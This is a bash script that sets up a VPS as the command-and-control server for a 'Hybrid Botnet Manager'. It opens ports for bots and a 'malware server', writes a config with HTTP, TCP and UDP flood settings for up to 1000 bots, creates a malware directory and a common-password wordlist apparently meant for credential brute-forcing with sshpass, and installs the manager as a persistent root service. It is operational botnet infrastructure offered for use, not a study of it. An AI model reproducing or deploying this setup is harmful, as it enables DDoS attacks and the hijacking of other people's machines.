#!/bin/bash

# VPS Setup Script for Hybrid Botnet Manager
# Run this on your VPS C2 server

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Functions
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root or with sudo
if [[ $EUID -ne 0 ]]; then
    print_warning "This script requires root privileges. Please run with sudo."
    exit 1
fi

print_status "🚀 Starting VPS setup for Hybrid Botnet Manager..."

# Update system
print_status "📦 Updating system packages..."
apt update && apt upgrade -y

# Install system dependencies
print_status "🔧 Installing system dependencies..."
apt install -y \
    python3 \
    python3-pip \
    python3-venv \
    python3-dev \
    git \
    curl \
    wget \
    sshpass \
    openssh-client \
    netcat-openbsd \
    telnet \
    htop \
    ufw \
    build-essential \
    libffi-dev \
    libssl-dev

print_success "System dependencies installed"

# Install optional security tools
print_status "🛡️ Installing security tools..."
apt install -y nmap masscan || print_warning "Some security tools failed to install"

# Get VPS IP address
print_status "🌐 Detecting VPS IP address..."
VPS_IP=$(curl -s -4 icanhazip.com 2>/dev/null || curl -s ifconfig.me 2>/dev/null || echo "UNKNOWN")
print_success "VPS IP detected: $VPS_IP"

# Setup firewall rules
print_status "🔥 Configuring firewall..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp     # SSH
ufw allow 7777/tcp   # Bots port
ufw allow 22222/tcp  # Users port  
ufw allow 6666/tcp   # Malware server
ufw allow 5000/tcp   # Web interface
ufw --force enable

print_success "Firewall configured"

# Create working directory
print_status "📁 Setting up working directory..."
WORK_DIR="/root/C2_panel"
mkdir -p $WORK_DIR
cd $WORK_DIR

# Create virtual environment
print_status "🐍 Creating Python virtual environment..."
python3 -m venv venv
source venv/bin/activate

# Upgrade pip
pip install --upgrade pip

# Install Python dependencies
print_status "📚 Installing Python dependencies..."
cat > requirements.txt << EOF
flask>=2.0.0
flask-socketio>=5.0.0
python-socketio>=5.0.0
requests>=2.25.0
cryptography>=3.0.0
psutil>=5.8.0
paramiko>=2.7.0
kamene>=0.32
pycryptodome>=3.9.0
EOF

pip install -r requirements.txt

# Try to install bane (might fail if not available)
pip install bane || print_warning "Bane package not available via pip"

print_success "Python dependencies installed"

# Create config template
print_status "⚙️ Creating configuration..."
cat > config_template.json << EOF
{
  "c2_host": "$VPS_IP",
  "c2_users_port": 22222,
  "c2_bots_port": 7777,
  "malware_port": 6666,
  "web_port": 5000,
  "max_users": 10,
  "max_bots": 1000,
  "encryption_key": "$(openssl rand -hex 32)",
  "log_level": "INFO",
  "auto_start_web": false,
  "enable_malware_server": true,
  "attack_defaults": {
    "http_flood": {
      "threads": 100,
      "timeout": 10,
      "duration": 300
    },
    "tcp_flood": {
      "threads": 50,
      "timeout": 5,
      "duration": 300
    },
    "udp_flood": {
      "threads": 50,
      "packet_size": 1024,
      "duration": 300
    }
  },
  "bot_management": {
    "heartbeat_interval": 30,
    "max_idle_time": 300,
    "auto_reconnect": true
  },
  "security": {
    "enable_encryption": true,
    "max_login_attempts": 3,
    "session_timeout": 3600
  },
  "monitoring": {
    "enable_logging": true,
    "log_rotation": true,
    "max_log_size": "10MB"
  }
}
EOF

# Copy template to actual config
cp config_template.json botnet_config.json

print_success "Configuration created with IP: $VPS_IP"

# Create malware directory
print_status "📁 Setting up malware directory..."
mkdir -p malware
mkdir -p logs
mkdir -p wordlists

# Create default wordlist
cat > wordlists/default_passwords.txt << EOF
password
123456
12345678
qwerty
abc123
password123
admin
root
user
guest
admin123
root123
123456789
letmein
welcome
password1
123123
dragon
master
monkey
EOF

print_success "Default wordlist created"

# Create systemd service
print_status "🔧 Creating systemd service..."
cat > /etc/systemd/system/botnet-manager.service << EOF
[Unit]
Description=Hybrid Botnet Manager
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$WORK_DIR
Environment=PATH=$WORK_DIR/venv/bin
ExecStart=$WORK_DIR/venv/bin/python3 $WORK_DIR/hybrid_botnet_manager.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable botnet-manager

print_success "Systemd service created"

# Create start script
cat > start.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
source venv/bin/activate
python3 hybrid_botnet_manager.py
EOF

chmod +x start.sh

# Test installation
print_status "🧪 Testing installation..."

# Test sshpass
if command -v sshpass >/dev/null 2>&1; then
    print_success "sshpass installed: $(sshpass -V 2>&1 | head -1)"
else
    print_error "sshpass not found!"
fi

# Test Python modules
source venv/bin/activate
python3 -c "
try:
    import paramiko
    print('✅ paramiko:', paramiko.__version__)
except ImportError:
    print('❌ paramiko not available')

try:
    import flask
    print('✅ flask:', flask.__version__)
except ImportError:
    print('❌ flask not available')

try:
    import socketio
    print('✅ socketio:', socketio.__version__)
except ImportError:
    print('❌ socketio not available')

import socket
print('✅ socket module OK')
"

print_success "Installation test completed"

# Final instructions
echo ""
echo "🎉 VPS SETUP COMPLETED!"
echo "========================================"
echo "📍 Working directory: $WORK_DIR"
echo "🌐 VPS IP address: $VPS_IP"
echo "🔧 Config file: botnet_config.json"
echo ""
echo "🚀 TO START:"
echo "1. cd $WORK_DIR"
echo "2. source venv/bin/activate"
echo "3. python3 hybrid_botnet_manager.py"
echo ""
echo "OR use systemd service:"
echo "sudo systemctl start botnet-manager"
echo "sudo systemctl status botnet-manager"
echo ""
echo "🔍 LOGS:"
echo "journalctl -u botnet-manager -f"
echo ""
echo "🔥 FIREWALL STATUS:"
ufw status numbered
echo ""
print_warning "Remember to upload your hybrid_botnet_manager.py file to $WORK_DIR"
